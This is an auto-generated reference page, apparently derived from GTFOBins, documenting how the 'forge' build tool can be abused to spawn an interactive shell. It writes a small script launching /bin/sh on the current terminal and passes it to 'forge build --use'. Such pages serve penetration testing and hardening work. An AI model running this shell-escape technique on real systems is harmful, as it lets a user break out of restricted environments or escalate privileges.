---
parsed_by: focuslocust
source: commands
type: generated
---
# forge Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## forge

Tool page: [forge](../../tools/linux/forge.md)

### shell

```text
echo '#!/bin/sh' >/path/to/temp-file
echo -e "/bin/sh <$(tty) >$(tty) 2>$(tty)" >>/path/to/temp-file
chmod +x /path/to/temp-file
forge build --use /path/to/temp-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/forge` |
| Evidence | Function example preserved from source parser. |
